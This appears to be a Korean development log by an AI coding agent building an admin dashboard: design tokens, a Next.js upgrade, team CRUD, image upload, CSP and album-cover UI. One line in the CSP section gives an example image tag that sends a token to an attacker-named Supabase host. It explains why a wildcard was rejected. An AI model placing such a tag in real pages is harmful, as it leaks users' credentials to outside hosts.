| 밀도·치수 | 컨트롤 36px, 표 행 44px, 사이드바 항목 40px, 페이지 여백 24px, 사이드바 232px, 상단 바 56px, 콘텐츠 최대 1200px, 목록 패널 272px | 브라우저에서 계산값으로 확인 |

**구조** — 교체 지점은 두 곳이다: `globals.css`의 `:root`(색·radius·글꼴·밀도·치수)와 `components/layout/`(`app-shell`, `sidebar`, `mobile-drawer`, `topbar`, `page-header`, `page-states`, `split-panel`). 메뉴 정의는 `lib/nav.ts` 한 곳. **컴포넌트에 색 하드코딩을 금지하는 규칙은 자동 검사**한다(`lib/design-tokens.test.ts`: `#hex`, `rgb()/hsl()/oklch()`, 팔레트 클래스 `bg-blue-500` 등, `bg-white`/`text-black` 같은 고정 흑백, 임의값 색상 클래스). 실제로 위반을 심어 검사가 잡는지 확인했다(그 과정에서 팔레트 규칙의 정규식이 `\b`를 이스케이프하지 않아 동작하지 않던 것을 발견해 고쳤다). 상단 바는 현재 위치(브레드크럼)를, 페이지 헤더는 제목·설명·주 동작을 맡아 같은 내용을 두 번 그리지 않는다.

**검증(승인용 화면 캡처 포함, 브라우저 자동화 + API 응답 대역 — 실서버·실계정 없음)**

| 항목 | 결과 |
| --- | --- |
| 치수·밀도 실측 | 사이드바 232px, 상단 바 56px, 본문 14px, 입력·버튼 36px, 표 행 44px, 분할 패널 272px + 나머지 |
| 1024px 경계 | 1023px: 사이드바 숨김·메뉴 버튼 표시 / 1024px: 사이드바 표시·메뉴 버튼 숨김 |
| 서랍(390px) | 가로 스크롤 없음, 메뉴 3개, Esc로 닫힘, **닫은 뒤 포커스가 메뉴 버튼으로 복귀**(수정 후 확인), 메뉴 선택 시 이동 후 닫힘, 서랍의 로그아웃 → `/login` |
| 로그인 유지 시간 | 정상: "로그인 유지 1시간 43분" 형식, **10분 이하 → 경고색**(계산값 `rgb(255, 180, 84)`) |
| 세션 만료 | 새 레이아웃에서도 경로·뒤 화면(사이드바·본문) 유지 + 재로그인 대화상자 |
| 캡처 6장 | 로그인 / 레이아웃(팀 관리 빈 페이지) / 곡 관리 분할 슬롯 / 표·뱃지·버튼 샘플(임시 페이지, 커밋하지 않고 삭제) / 모바일 서랍 / 세션 만료 대화상자 |
| `apps/admin` | lint · typecheck · build · test **135개** 통과, `npm audit` **0건** |

**Next 16.3.5 상향과 audit 결과(결정 A)**: `apps/admin`의 `next`·`eslint-config-next`를 **16.3.5로 정확 고정**했다. `npm audit` 결과 **0 vulnerabilities**(16.2.4에서는 critical 1 + high 2), lint·build·typecheck·테스트 135개 통과. **공개 사이트(루트)는 이번 브랜치에서 건드리지 않았고 루트 lockfile 변경은 0**(해시 불변)이다. 공개 사이트도 같은 16.2.4의 audit critical 상태이므로 **별도 PR로 분리**했다(7d 목록 참조). **이 앱이 실제로 쓰는 기능(proxy·Server Actions·이미지 최적화)과 취약점 범위의 겹침은 건별로 확인하지 못했다 — 미확인.** 추정으로는 `apps/admin`은 proxy·Server Actions를 쓰지 않고 이미지 최적화 API는 `images.unoptimized: true`로 꺼 두었지만, 16.3.5로 올렸으므로 겹침 여부와 무관하게 해소됐다.

**`cn` 제거(결정 B)**: `cn@0.3.2`를 제거하고 `clsx` 2.1.1 + `tailwind-merge` 3.7.0(정확 고정)으로 `src/lib/utils.ts`를 구성했다. shadcn CLI가 앞으로 `add`로 컴포넌트를 만들면 `from "cn"` import를 다시 생성할 수 있으므로, **`shadcn add` 뒤에는 import를 `@/lib/utils`로 바꾸고 `cn` 패키지가 다시 들어오지 않았는지 확인**한다(`package.json` 확인).

### 7c-1c — CleanPay 레퍼런스 비교 디자인 정비 (2026-09-22)

**배경**: 관리자 프론트가 7c-1b에서 만든 어두운 사이드바 레이아웃을 갖췄지만, 세부 톤(사이드바 색·주색·뱃지 형태·표 스타일)이 여전히 공개 랜딩 페이지의 인상과 가까워 "관리자 대시보드로서 시각적으로 명확히 구분되길" 원한다는 요청이 있었다. 레퍼런스로 CleanPay 화면(스크린샷)이 제시됐고, 아래 토큰·구조 변경으로 반영했다. 색은 계속 `globals.css`의 `:root` 한 곳에만 두고, `design-tokens.test.ts`(하드코딩 금지 자동 검사)가 그대로 통과함을 확인했다.

**변경된 토큰값**(대비율은 WCAG 공식으로 재계산)

| 토큰 | 이전 | 변경 후 | 대비 |
| --- | --- | --- | --- |
| `--sidebar`(사이드바 배경) | `#141a24` | `#181f47` | 글자(`#d3dae6`) 11.27:1 |
| `--sidebar-active`(활성 메뉴) | `#0b3a63`(밝은 강조) | `#10142f`(기본 사이드바보다 **어두운** 톤) | 흰 글자 18.05:1 |
| `--sidebar-indicator`(활성 왼쪽 막대) | `#3b9eff` | `#5b8fff`(새 주색 계열로 재계산) | 사이드바 위 5.14:1 |
| `--sidebar-hover` / `--sidebar-border` | `#1e2634` / `#252d3b` | `#232b57` / `#2a3363` | — |
| `--primary`(주색) | `#0072c0` | `#0155ff` | 흰 글자 5.61:1 |
| `--primary-hover` | `#005fa3` | `#0040c4` | 흰 글자 8.30:1 |
| `--info`, `--ring` | `#0072c0` | `#0155ff`(주색과 동일 유지) | — |
| `--badge-success-fg`(뱃지 초록) | `#0f5a29`(변경 없음) | `#0f5a29` | 배경 위 7.24:1 |
| `--badge-warning-fg`(뱃지 주황) | `#6f4700` | `#7a4b00` | 배경 위 6.52:1 |
| `--badge-info-fg`(뱃지 파랑) | `#00507f` | `#0040c4`(새 주색 기준 재계산) | 배경 위 7.05:1, 흰 배경 8.30:1 |
| `--radius`(전체 모서리) | `0.5rem`(8px) | `0.25rem`(4px, 각진 인상) | — |
| `--background`(페이지 배경) | `#f3f5f8` | `#f2f5fa` | 본문 글자(`#1b2430`) 14.32:1 |

**구조 변경**

1. **브레드크럼 이동**: `Topbar`(상단 바)에 있던 현재 위치(브레드크럼)를 `PageHeader`(제목 바로 위)로 옮겼다. 상단 바는 이제 모바일 메뉴 버튼 중심(데스크톱 1024px 이상에서는 사실상 빈 바)이다
2. **제목 크기 분리**: 새 토큰 `--fs-page-title: 1.5rem`(24px, `@theme`의 `--text-page-title`)을 추가해 `PageHeader`의 `<h1>`에만 쓴다. 기존 `--fs-title`(20px)은 로그인 화면 브랜드 제목 등 다른 곳에 그대로 남겨 영향받지 않는다
3. **표(Table) 정비**: 머리글을 옅은 면(`bg-muted`)에서 흰 배경 + 굵은 글자(`font-bold text-foreground`)로 바꾸고, `Table` 컴포넌트에 `totalCount?: number` prop을 추가해 표 위에 "전체 N건"을 표시한다(실제 데이터가 있는 화면에서만 넘긴다). 번호·상태·일자처럼 짧은 값 열은 호출부가 `className="text-center"`를 얹어 가운데 정렬하고, 이름 열은 기본값(왼쪽 정렬)을 그대로 쓴다 — 컴포넌트 자체는 정렬을 강제하지 않는다
4. **행 끝 동작 버튼**: `Button`에 `variant="subtle"`(`bg-primary/10 text-primary hover:bg-primary/20`, 기존 `destructive` 변형과 같은 opacity-mix 패턴)을 추가해 옅은 파랑 배경 + 파랑 글자로 표시한다
5. **뱃지 형태**: `rounded-full`(알약형)에서 `rounded-sm` + `border`(테두리는 글자와 같은 색)로 바꿔 각진 인상을 준다

**검증**: `apps/admin` lint·typecheck·build·test **135개 그대로 통과**(색 하드코딩 금지 검사 포함), 루트 공개 프론트·`apps/api` 무변경. 임시 미리보기 페이지(`app/preview-table-sample/`, 로그인 화면/데스크톱·모바일 레이아웃/표·뱃지·버튼 샘플)로 브라우저 캡처 4장을 확인한 뒤 **커밋하지 않고 삭제**했다(7c-1b와 같은 방식).

### 이 단계에서 의도적으로 하지 않은 것

- **팀·곡·앨범 커버·유튜브 리뷰의 실제 화면**(7c-2~4), 드래그 재정렬(dnd-kit)·이미지 업로드·크롭
- **`apps/api` 변경**(쿠키 인증·refresh·OpenAPI·새 엔드포인트 — 아래 요청 목록), **DB 변경**, **공개 프론트 변경**, **`apps/web` 이동**, **59곡 배치 실행**
- **배포·DNS·Vercel 프로젝트 생성**(7d, 사용자가 한다), 대시보드 작업
- **BFF·쿠키 인증**(로그인 제한 공유 부작용, 위 조사), **nonce 기반 CSP**, **다크모드**, **접이식 사이드바**
- **컴포넌트 테스트(jsdom·RTL)·E2E(Playwright 패키지)·토스트(sonner)** — 필요한 화면이 생기는 7c-2 이후
- **공개 프로젝트의 Vercel ignored build step**(결정 4), **루트 workspaces 도입**
- ~~**Next 16.3.5로의 상향**~~ **[2026-09-22: `apps/admin`은 상향 완료(audit 0건). 공개 사이트(루트)는 이번 브랜치에서 건드리지 않고 별도 PR로 분리]**

### API 요청 목록 (API는 변경하지 않았다. 별도 승인 항목)

1. **OpenAPI 스펙 노출** — 손으로 옮긴 계약 타입(`types.ts`)의 드리프트를 구조적으로 막는 유일한 방법
2. **"재검토 필요" 전용 조회**(`youtube_url`이 있고 `pending`인 곡) — §10에 이미 있는 항목. 없으면 화면이 전 팀의 곡을 받아 걸러야 한다(7c-4)
3. **팀 목록에 곡 수 포함** — 없으면 팀 15개에 대해 `GET /teams/:id/songs`를 15번 호출(N+1, 7c-2/3)
4. (참고, 요청 아님) 로그아웃은 서버측 무효화가 없어 **클라이언트 토큰 삭제뿐**이다. 현행 유지가 §16의 결정이다

### 남겨둔 결정 (7c-2로 이월)

1. ~~**Next 16.3.5로 올릴지(admin과 공개 사이트 각각)**~~ **[2026-09-22: admin은 상향 완료. 남은 것은 공개 사이트(루트) — 루트 lockfile이 바뀌므로 별도 PR·Vercel 프리뷰 확인(7d 목록)]**
2. **dnd-kit(core 6.3.1, sortable 10.0.0) 승인** — 팀 재정렬(7c-2a). 위/아래 버튼을 키보드 대체 수단으로 병행한다
3. **CSP 이미지 호스트 추가 시점** — 7c-2 팀 카드(Supabase Storage `https://*.supabase.co`), 7c-3 앨범 커버(`https://is1-ssl.mzstatic.com`), 7c-4 유튜브 썸네일(`https://i.ytimg.com`)
4. **`NEXT_PUBLIC_PUBLIC_SITE_ORIGIN`의 실제 사용** — 팀 카드 미리보기(7c-2). 비어 있으면 상대경로 이미지를 표시하지 못한다
5. **폼 임시저장** — 제자리 재로그인은 "페이지가 유지되는 동안"만 폼을 보존한다. 새로고침·탭 닫힘에는 유실된다. 긴 폼(곡 여러 개 등)에서 필요하면 7c-2에서 sessionStorage 초안 훅을 검토
6. **재로그인 후 마지막 계정 이름 기억**(트러블슈팅 6), **컴포넌트 테스트 도입 시점**(폼이 생기는 7c-2), **토스트(sonner) 필요 여부**
7. **nonce 기반 CSP** — `'unsafe-inline'` 제거. proxy + 동적 렌더링이 필요해 7d 이후 재검토
8. **메뉴가 늘어날 때의 사이드바 스크롤 대응**, **다크모드**(만들지 않기로 결정) — 사이드바 메뉴 영역은 `overflow-y-auto`라 항목이 늘어도 깨지지 않는다
9. §10의 관리자 UI 요건은 **그대로 유지**(팀: 4:5 안내·CDN 캐시 주의·1MB/413, 곡: 앨범 커버 후보 선택·URL 직접 입력·영문 표기 안내, 유튜브: 쿼터·`abortedBy`·승인/반려/재큐·409 새로고침·재검토 목록·썸네일 도메인). 로그인 제출 전 검증(L5)은 이번에 처리했다

### 7d(배포) 때 내가 할 일 — 초안 (사용자, 대시보드 작업은 이 단계에서 하지 않았다)

1. **Vercel에서 새 프로젝트 만들기**(같은 GitHub 레포): Import → **Root Directory `apps/admin`** → Framework Preset Next.js → Node.js 버전 24.x(CI와 같게). 조직 소유 레포이므로 플랜이 Hobby가 아닌지 확인(**확인 필요**)
2. **환경변수**(Production·Preview 각각): `NEXT_PUBLIC_API_BASE_URL`(배포된 API의 **https** 주소, 경로·끝 슬래시 없이), 필요하면 `NEXT_PUBLIC_PUBLIC_SITE_ORIGIN=https://summit-concert.live`. **이 값은 빌드 시점에 번들과 CSP에 박힌다 — 바꾸면 재배포해야 한다.** 비밀값을 넣지 않는다
3. **Ignored Build Step**: Settings → Build and Deployment → Ignored Build Step → **"Only build if there are changes in a folder"** → `apps/admin`. 종료 코드 0이면 빌드가 취소되고 1이면 진행된다(공식 문서). **공개 프로젝트에는 걸지 않는다**(결정 4) — 그래서 `apps/admin` 커밋에도 공개 사이트가 한 번 더 빌드된다. 취소된 빌드도 배포 쿼터·동시 빌드 슬롯을 쓴다
4. **도메인** `admin.summit-concert.live`: DNS 관리 위치는 **미확인**. Vercel 프로젝트에 도메인을 추가하고, Vercel이 안내하는 레코드(보통 CNAME)를 DNS에 추가한다
5. **API 쪽 설정**: `CORS_ALLOWED_ORIGINS=https://admin.summit-concert.live`(경로·끝 슬래시·대문자 없는 정규형. `http:`는 루프백만 허용된다). 그리고 §16의 배포 값 3가지 — `TRUST_PROXY_HOPS`(틀리면 로그인 제한이 우회되거나 전원이 한 IP로 집계된다, 배포 직후 `req.ip` 실측), `CORS_ALLOWED_ORIGINS`, 권한 회수 실행 여부
6. **Preview 배포는 API의 CORS 허용 목록에 없다** — 프리뷰 URL에서는 API 호출이 브라우저에서 막힌다. 프리뷰로는 화면 렌더까지만 보고, 기능 검증은 프로덕션 admin에서 한다(프리뷰 오리진을 API에 넣는 것은 권장하지 않는다)
7. **배포 뒤 확인**: 로그인 → 팀 관리 진입, 401·429 문구, 응답 헤더(CSP·`X-Frame-Options`)와 콘솔의 CSP 위반 0건, 모바일 실기기, 스크린리더. Deployment Protection(Vercel Authentication) 적용 범위와 `robots` `noindex` 확인
8. **공개 사이트(루트) Next 상향 — 별도 PR**: `next`·`eslint-config-next`를 16.3.5로 올리는 루트 lockfile 변경이라 `apps/admin` 작업과 분리한다. **Vercel 프리뷰 배포로 공개 페이지(홈·`/setlist`·`/event-goods`, 이미지·동적 렌더링)를 확인한 뒤** 머지한다. 공개 사이트도 현재 audit critical(16.2.4) 상태다. `apps/admin`은 이미 16.3.5다

### 로컬 개발 절차 (사용자)

`apps/admin/README.md` 참조. 요약: `apps/api/.env`에 `CORS_ALLOWED_ORIGINS=http://localhost:3010`을 한 줄 추가(비밀값 아님, 현재 `.env`에는 이 이름이 **없다** — 이름 존재 여부만 확인했고 값은 열지 않았다) → `apps/api`에서 `npm run start:dev`(3001) → `apps/admin`에서 `npm run dev`(3010). 같은 DB에 API 서버를 둘 이상 띄우지 않는다. `apps/admin/.env.local`에는 `NEXT_PUBLIC_API_BASE_URL=http://localhost:3001`을 넣어 두었다(공개 값, gitignore).

### 롤백

`apps/admin`은 신규 폴더이고 DB·스키마·다른 앱 변경이 없다. 되돌리려면 커밋을 되돌리거나 폴더를 지우면 된다. CI의 `admin` 잡은 `ci.yml`의 한 블록이다. Vercel 프로젝트는 아직 만들지 않았다.

### 완료 상태 및 다음 단계

- 브랜치 `feature/admin-app-scaffold`, 푸시·PR 보류
- **다음**: 7c-2a 팀 CRUD(재정렬 포함, dnd-kit 승인 필요) → 7c-2b 카드 이미지 업로드(**프로덕션 첫 쓰기 지점**) → 7c-3 곡·앨범 커버 → 7c-4 유튜브 리뷰·배치 → 7d 배포 → 59곡 유튜브 배치·리뷰

## 19. work02-7c-2a — 관리자 팀 CRUD UI (2026-09-22)

### 배경

7c-1(관리자 프론트 뼈대: 로그인·인증·레이아웃·API 클라이언트) 머지 완료 뒤, 관리자가 실제로 쓰는 첫 기능인 팀(Line Up) CRUD를 `apps/admin`에 구현했다. 백엔드 팀 API는 work02-3에서 이미 구현·검증됐고(PR #33), 이번 작업은 기존 API를 붙이는 화면 작업이다.

### 구현 전 조사

`apps/api/src/teams/teams.controller.ts`·`teams.service.ts`·DTO를 먼저 읽고 두 가지를 확정했다:

1. **삭제 엔드포인트가 없다.** 컨트롤러 주석에 "삭제는 MVP 스코프 밖이라 만들지 않는다(오입력은 수정으로 대응)"고 명시돼 있다. 작업 지시에는 "팀 삭제(확인 다이얼로그 필수)"가 포함돼 있었지만, 추측으로 만들지 않고 사용자에게 확인해 **이번 범위에서 삭제 UI를 제외**했다.
2. **재정렬은 day 단위 배치 엔드포인트**(`PATCH /teams/reorder`)다. `{ day, teamIds }`(해당 day 전체 팀 id를 원하는 순서로)를 받아 배열 인덱스로 서버가 1..N을 부여한다. 부분 목록은 400. 수정 엔드포인트(`PATCH /teams/:id`)에는 `performanceOrder`가 없다 — day가 바뀌면 서버가 순서를 대상 day의 맨 뒤로 재배치한다.

### 설계 결정 (사용자 승인)

- **드래그 정렬 후 반영 시점**: `src/lib/query-client.ts`에 이미 "낙관적 업데이트는 쓰지 않는다: 순서 재정렬·승인처럼 서버가 권위인 변경은 서버 응답을 받은 뒤 화면을 바꾼다"는 기존 방침이 재정렬을 예시로 명시돼 있었다. 처음에 사용자가 낙관적 업데이트를 골랐으나, 이 기존 방침을 다시 확인시켜드리자 **기존 방침대로 서버 응답 후 반영**으로 정정했다. 드래그 중에는 "순서 적용 중…" 표시만 하고, `PATCH /teams/reorder` 응답이 온 뒤에만 줄 순서를 바꾼다.
- **dnd-kit 의존성**: `@dnd-kit/core@6.3.1`, `@dnd-kit/sortable@10.0.0`, `@dnd-kit/utilities@3.2.2`(useSortable의 `CSS.Transform` 변환에 필요해 추가) — 다른 의존성과 같은 관례로 버전을 정확히 고정(캐럿 없음)했다.

### 작업 내용

- `src/lib/api/types.ts`: `Team` 타입 추가(서버 `TeamResponse` 미러링)
- `src/lib/api/teams.ts`(신규): `listTeams`/`createTeam`/`updateTeam`/`reorderTeams` — API 클라이언트 래퍼
- `src/lib/teams/team-schema.ts`(신규): 서버 DTO와 같은 규칙의 zod 스키마(`teamName`·`day`·`performanceOrder`, `day` 정규식 `^day[1-9]\d*$`은 서버와 동일)
- `src/lib/teams/group-by-day.ts`(신규): 목록을 day별로 묶는 순수 함수. day가 없는 팀(API 계약상 nullable)은 별도 그룹으로 두고 재정렬 대상에서 제외
- `src/components/teams/`(신규): `team-create-dialog.tsx`(등록, 3필드), `team-edit-dialog.tsx`(수정, 2필드 — 순서는 재정렬 전용), `team-day-table.tsx`(dnd-kit 드래그 정렬 표), `teams-page-client.tsx`(목록 조회 + 다이얼로그 연결)
- `src/app/(admin)/teams/page.tsx`: 자리표시 화면을 `TeamsPageClient`로 교체(서버 컴포넌트는 메타데이터만 유지)
- `package.json`: dnd-kit 3종 추가

### 검증

- **정적 검증**: `npm run typecheck`(무오류) · `npm run lint`(무오류) · `npm run build`(성공) · `npm run test`(8개 파일 135개 테스트 통과, `design-tokens.test.ts` 포함 — 새 하드코딩 색상 없음)
- **로컬 실동작 검증(프로덕션 Supabase DB 연결)**: 검증 전 `Line Up` 테이블 스냅샷(15행) 확보 → 사용자가 직접 로그인해 목록 조회·등록(유효성 검사·409 충돌 포함)·수정(day 변경 시 안내 문구·맨 뒤 재배치)·드래그 정렬(로딩 표시 → 응답 후 반영)을 체크리스트로 확인 → 테스트 레코드(id=25) 삭제는 API에 없어 사용자 승인 하에 `mcp__supabase__execute_sql`로 직접 DELETE(조건에 id·team_name·day 3중 명시) → 정리 후 스냅샷 diff=0 확인(행 수·모든 값 원복)

### 트러블슈팅 기록

1. **CORS fail-closed**: `apps/api/.env`에 `CORS_ALLOWED_ORIGINS`가 없어 로컬 admin(3010)의 모든 API 호출이 막혔다(§10 CORS 하드닝이 fail-closed로 설계된 그대로 동작한 것). `.env`(gitignore)에 `CORS_ALLOWED_ORIGINS=http://localhost:3010` 추가로 해결.
2. **재시작 후에도 CORS 미반영**: 원인은 배경 프로세스 관리 실수였다 — 첫 API 서버를 `(npm run start:dev &)` 형태의 셸 서브프로세스로 띄워서 작업 트래커가 잡고 있는 프로세스와 실제 리스닝 프로세스가 분리됐다. `.env` 수정 후 "재시작"한 새 프로세스는 `EADDRINUSE:3001`로 기동에 실패했고, CORS 설정이 없던 **구 프로세스가 계속 3001에서 응답**하고 있어 몇 차례 확인에도 CORS가 반영되지 않은 것처럼 보였다. `netstat`로 포트를 쥔 실제 PID를 찾아 강제 종료한 뒤에야 새 설정으로 재기동됐다. 이후 배경 프로세스는 셸 서브프로세스로 감싸지 않고 도구의 백그라운드 실행 기능에 직접 맡기는 방식으로만 띄웠다.
3. **검증 레코드 이름 불일치**: 사용자가 실제로 만든 테스트 레코드가 `__verify__` 접두사 대신 `새로운 팀`(입력 폼 기본값으로 추정)이라는 이름으로 남아 있었다. 정리 SQL을 실행하기 전, 이 레코드가 정말 테스트용이 맞는지 사용자에게 먼저 확인받았다.

### API 요청 목록

없음. 기존 팀 API(work02-3, PR #33)를 그대로 사용했다.

### 완료 상태 및 다음 단계

- 브랜치 `feature/admin-team-crud`(`develop`에서 분기) → PR #41 → **CI 전체 통과 후 `develop`에 머지 완료**
- 팀 삭제 UI는 이번 범위에서 제외했다. 필요해지면 별도 work로 백엔드 `DELETE /teams/:id`(연관 `Setlist.teamId` FK 처리 방식 결정 포함) 설계부터 시작한다
- **다음**: 7c-2b 카드 이미지 업로드(**프로덕션 첫 쓰기 지점**, Supabase Storage 연동) → 7c-3 곡·앨범 커버 → 7c-4 유튜브 리뷰·배치

## 20. work02-7c-2b — 관리자 카드 이미지 업로드 UI (2026-09-22)

### 배경

7c-2a(팀 CRUD) 머지 완료 뒤, 팀 카드뉴스 이미지 업로드를 관리자 UI에 붙였다. 백엔드는 work02-5(§13, PR #35)에서 이미 구현·검증됨(F007) — 새 API를 만드는 게 아니라 기존 업로드 엔드포인트(`PUT /teams/:id/card-image`)를 붙이는 작업이다.

### 구현 전 조사

`apps/api/src/teams/team-card-image.*`·`storage/*`를 읽고 확정한 계약:

- multipart, 필드명 **`file`** 고정, 파일 1개만(`parts: 1`)
- 크기 상한 **1MB**(앱 레벨. 버킷 자체 제한 2MB보다 앱이 먼저 막음), 형식은 **매직바이트로 판별**(JPEG/PNG/WebP만, 확장자·Content-Type 불신 — 이 레포 실데이터가 `.png` 확장자인데 실제로 JPEG였던 전례가 근거)
- 업로드마다 새 경로(`{teamId}/{uuid}.ext`), **이전 객체는 지우지 않는다**(CDN `purgeCache` 비활성이라 같은 경로를 덮으면 캐시를 비울 수단이 없음)
- **삭제 가능 여부**: "정책상 안 함"이 맞고 기능 자체는 있다. `SupabaseStorageClient.remove()`가 실제로 구현돼 있고 서버의 보상 삭제 경로(DB 반영 실패 시)에서 쓰인다. 관리자 HTTP API에만 삭제 엔드포인트가 없다(의도적 제외) — 검증 후 정리하려면 서비스 키로 Storage REST `DELETE`를 직접 호출해야 한다

### 설계 결정 (사용자 승인)

- **CSP img-src**: `csp.ts`의 기존 TODO는 `https://*.supabase.co` 와일드카드를 적어 두었지만, 같은 파일의 "최소 권한, 미리 열어 두지 않는다" 원칙과 어긋난다고 판단해 사용자에게 확인했다. **결과: 와일드카드 대신 `NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN` 새 환경변수로 우리 프로젝트 오리진 하나만 연다.** `*.supabase.co`는 누구나 무료로 프로젝트를 만들 수 있어, 와일드카드는 XSS 상황에서 `<img src="https://attacker.supabase.co/?=토큰">` 같은 유출 통로가 될 수 있다는 게 근거다
- **검증 업로드 전략**: 임시 검증 팀(`__verify__` 접두사) 1개를 만들어 그 팀에만 업로드하고, Storage 객체는 서비스 키로 직접 삭제, DB 행은 SQL로 직접 삭제(기존 §19 프로토콜과 동일)

### 작업 내용

- `src/lib/csp.ts`: `supabaseStorageOrigin` 옵션 추가, `next.config.ts`·`.env.example`·`.env.local`에 `NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN` 배선
- `src/lib/teams/card-image.ts`(신규): 서버와 같은 규칙(1MB, 매직바이트 판별)의 클라이언트 측 사전 검사 + `cardImageUrl`(절대 URL 또는 기존 15팀의 공개 사이트 상대경로) 해석 함수
- `src/lib/api/teams.ts`: `uploadTeamCardImage`(PUT, FormData) 추가
- `src/components/teams/card-image-thumb.tsx`(신규): 목록·폼이 공유하는 썸네일/플레이스홀더
- `src/components/teams/team-card-image-field.tsx`(신규): 업로드 필드 — 파일 선택 시 즉시 올리지 않고 미리보기 후 **버튼을 눌러야** 올라간다(되돌릴 수 없는 저장소 쓰기라 실수 방지). `key={team.id}`로 다른 팀을 열면 새로 마운트되어 이전 선택이 남지 않게 한다(이펙트에서 setState 하지 않는 방식 — `react-hooks/set-state-in-effect` 회피)
- `team-edit-dialog.tsx`·`team-day-table.tsx`: 업로드 필드·썸네일 열 연결
- `eslint.config.mjs`: `@next/next/no-img-element` 끔(이미지 최적화를 껐으므로 `next/image`를 쓸 이유가 없음, 주석으로 근거 명시)

### 검증

- **정적 검증**: typecheck·lint·test(카드 이미지 판별·CSP 오리진 테스트 포함)·build 전부 통과
- **프로덕션 실동작 검증 — 최소 노출 시간 원칙 적용**: 생성→업로드→삭제를 끊지 않고 연속으로 진행, 전 단계 타임스탬프(UTC) 기록

  | 단계 | 시각 |
  | --- | --- |
  | 기준선(팀 15행, 객체 0개) | 14:08:12 |
  | 사용자 업로드 완료 보고 | 14:12:08 |
  | 오브젝트 실제 `created_at`(Storage 기록) | 14:11:40 |
  | Storage 삭제 요청 → 응답 200 | 14:12:25 → 14:12:27 |
  | DB 행 삭제 요청 | 14:12:30 |
  | 정리 완료 확인(diff=0) | 14:12:33 |

  오브젝트 노출 시간 약 53초. 정리 후 `Line Up` 15행·`storage.objects` 0개로 기준선과 diff=0 확인. 업로드 파일은 미리 준비한 68바이트 더미 대신 사용자가 고른 158,816바이트 PNG였으나(1MB 상한 안) 결과에 영향 없음

### CDN 캐시 잔존 리스크 (§13에서 이미 알려진 한계, 이번에 다시 확인)

Storage 객체를 지워도 `purgeCache`가 비활성이라 CDN 엣지에 남은 사본은 즉시 사라지지 않는다(`cache-control: max-age=31536000` = 1년). §13 트러블슈팅에도 "실제로 삭제된 객체가 CDN에서 계속 200으로 나왔다"고 기록돼 있다. 즉 **정확한 URL을 아는 사람에게는 삭제 후에도 한동안 이미지가 보일 수 있다.**

다만 실질 노출 위험은 낮다고 판단한다 — 경로가 `{teamId}/{uuid}.ext`로 추측 불가능한 UUID이고, 삭제된 객체의 URL은 DB에서도 즉시 제거되어(이번 검증에서 `image_src` 컬럼째 삭제) **공개 사이트를 포함한 어디에도 그 URL로의 링크가 남지 않는다.** URL을 알아내려면 삭제 직전에 정확한 값을 이미 갖고 있어야 하므로, 일반 방문자나 크롤러가 우연히 도달할 경로가 아니다. 이후 카드 이미지 삭제(예: 7c-2b 검증, 향후 실사용) 때도 같은 전제(추측 불가능한 경로)가 유지되는 한 이 리스크는 낮은 채로 남는다.

### 완료 상태 및 다음 단계

- 브랜치 `feature/admin-team-image-upload`(`develop`에서 분기) → PR #42 → **CI 통과 후 `develop`에 머지 완료**
- **다음**: 7c-3 곡·앨범 커버 → 7c-4 유튜브 리뷰·배치

## 21. work02-7c-3 — 관리자 곡/앨범 커버 UI (2026-09-22)

### 배경

7c-2b(카드 이미지 업로드) 머지 완료 뒤, 곡(Setlist) CRUD + 앨범 커버 자동 매칭 UI를 apps/admin에 구현했다. 백엔드는 work02-4(곡 CRUD)와 work02-5(§13, F010 앨범 커버, PR #35)에서 이미 구현·검증됨 — 새 API를 만드는 게 아니라 기존 API를 붙이는 작업이다.

### 구현 전 조사

7c-2a에서 팀 삭제 API가 없다는 것을 뒤늦게(구현 중) 발견했던 전례가 있어, 이번엔 **시작 전에** `apps/api/src/songs/*`·`album-cover/*`를 먼저 읽고 확정한 계약:

- **곡 조회**: `GET /teams/:teamId/songs` — 없는 팀은 빈 배열이 아니라 **404**(잘못된 id와 "곡 0건"을 구분)
- **곡 등록**: `POST /teams/:teamId/songs` — 본문은 `{title, singer}`만, `teamId`는 경로로만 정해짐(곡의 팀 이동이 구조적으로 불가능). 같은 팀 안 (제목+가수) 중복이면 409(NFC 정규화 비교)
- **곡 수정**: `PATCH /songs/:id`(평탄한 경로, 팀 하위 아님) — `teamId`를 건드릴 수 없음. **부작용**: 제목·가수가 실제로 바뀌면 서버가 `youtubeReviewStatus`를 `pending`으로 되돌린다(URL은 유지) — 화면이 안내해야 하는 항목
- **곡 삭제**: **없음**(`team-songs.controller.ts`에 "MVP 스코프 밖" 명시, 팀과 동일 방침) → 이번에도 삭제 UI 제외
- **순서**: `Setlist`에 순서 컬럼이 없어 서버가 `id` 오름차순으로 고정 → 곡 재정렬 기능 없음
- **앨범 커버(F010)**: `GET /songs/:id/album-cover/candidates`(최대 5개, **DB 미기록**, 0건도 정상) + `PUT /songs/:id/album-cover`(명시 반영). iTunes 호출은 **프로세스 전체 분당 15회** 공유(429), 타임아웃 5초(504). URL은 호스트(`is1-ssl.mzstatic.com`)+경로(`…/600x600bb.jpg`)+길이(255자) allowlist로 검증

### 설계 결정 (사용자 승인)

- **화면 구조**: 7c-1에서 만들어 둔 `SplitPanel`을 처음 사용 — 좌측 팀 목록(선택) / 우측 선택 팀의 곡 표. PRD의 "팀 선택 → 해당 팀 곡 패널" 그대로
- **앨범 커버 UI**: 모달 안에서 "후보에서 고르기" / "URL 직접 입력" **두 경로를 버튼 토글**로 전환(라이브러리 추가 없이 구현). §10이 남긴 필수 요건 3가지(후보 선택, URL 직접 입력 + 거부 이유 안내, 영문 표기 주의 문구)를 모두 반영
- **후보 검색 트리거**: 모달을 열어도 자동 검색하지 않고 **버튼을 눌렀을 때만** iTunes를 호출 — 분당 15회 예산을 대화상자 여닫기만으로 소모하지 않기 위함
- **CSP img-src의 앨범 커버 호스트**: 환경변수가 아니라 **코드 상수**(`ALBUM_COVER_IMAGE_ORIGIN = https://is1-ssl.mzstatic.com`)로 고정. 서버의 저장 허용 호스트(`ALBUM_COVER_ALLOWED_HOSTS`)와 반드시 같은 값이어야 하는데, 환경변수로 빼면 두 값이 배포 환경마다 갈릴 위험이 생긴다(팀 카드 Storage 오리진은 프로젝트마다 다른 값이라 env가 맞지만, 이건 전역 고정값이라 다름)

### 작업 내용

- `src/lib/api/types.ts`: `Song`·`AlbumCoverCandidate`·`YoutubeReviewStatus` 타입 추가
- `src/lib/api/songs.ts`(신규): `listTeamSongs`/`createSong`/`updateSong`/`fetchAlbumCoverCandidates`/`updateAlbumCover`
